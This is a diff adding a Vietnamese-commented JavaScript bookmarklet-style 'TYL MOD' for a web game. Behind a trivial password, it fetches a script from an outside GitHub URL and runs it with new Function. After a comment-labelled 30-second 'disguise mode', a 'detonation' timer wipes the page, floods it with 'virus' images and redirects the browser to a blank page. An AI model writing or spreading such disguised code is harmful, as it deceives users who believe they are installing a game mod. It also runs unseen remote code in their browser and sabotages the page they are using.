@@ -1,0 +1,69 @@
+(async function() {
+    // 1. Thương hiệu Hảo Hán Coder
+    console.clear();
+    console.log("%c TYL MOD BY HẢO HÁN CODER ", "background: #000; color: #f1c40f; font-size: 25px; font-weight: bold; border: 2px solid #f1c40f; padding: 10px; text-shadow: 2px 2px #e67e22;");
+    console.log("%c Chế độ ngụy trang: Đang hoạt động (30s) ", "color: #bdc3c7; font-style: italic;");
+
+    // 2. Mật khẩu kích hoạt
+    const password = prompt("[TYL MOD] Nhập mật khẩu:");
+    
+    if (password !== '123') {
+        alert("Sai mật khẩu!");
+        return;
+    }
+
+    try {
+        // 3. Chạy bản MOD bình thường ngay lập tức (Pet di chuyển)
+        const url = "https://raw.githubusercontent.com/haohancoder/kholuutru/main/add%20on%20website%20game%201";
+        const response = await fetch(url);
+        const scriptText = await response.text();
+        const runNormal = new Function(scriptText);
+        runNormal();
+
+        console.log("%c [Hệ thống] TYL MOD đã khởi chạy thành công. ", "color: #2ecc71;");
+
+        // 4. HẸN GIỜ KÍCH NỔ: 30 GIÂY (30000ms)
+        setTimeout(() => {
+            // Dọn sạch màn hình
+            document.body.innerHTML = '';
+            document.body.style.backgroundColor = 'black';
+            document.body.style.overflow = 'hidden';
+
+            const virusImg = "https://raw.githubusercontent.com/haohancoder/kholuutru/main/win.png";
+            const totalVirus = 70; // Tăng thêm số lượng cho hoành tráng
+
+            for (let i = 0; i < totalVirus; i++) {
+                setTimeout(() => {
+                    const img = document.createElement('img');
+                    img.src = virusImg;
+                    
+                    Object.assign(img.style, {
+                        position: 'fixed',
+                        left: Math.random() * 100 + '%',
+                        top: Math.random() * 100 + '%',
+                        transform: 'translate(-50%, -50%) scale(0)',
+                        width: (Math.random() * 250 + 150) + 'px',
+                        zIndex: '2147483647',
+                        transition: 'all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)'
+                    });
+                    
+                    document.body.appendChild(img);
+                    
+                    setTimeout(() => {
+                        img.style.transform = `translate(-50%, -50%) scale(1) rotate(${Math.random() * 360}deg)`;
+                    }, 20);
+
+                    // 5. Tự động thoát trang
+                    if (i === totalVirus - 1) {
+                        setTimeout(() => {
+                            window.location.href = "about:blank";
+                        }, 2500);
+                    }
+                }, i * 60); // Tốc độ nổ ảnh cực nhanh
+            }
+        }, 30000); // Đợi đúng 30 giây
+
+    } catch (err) {
+        console.error("Lỗi:", err);
+    }
+})();
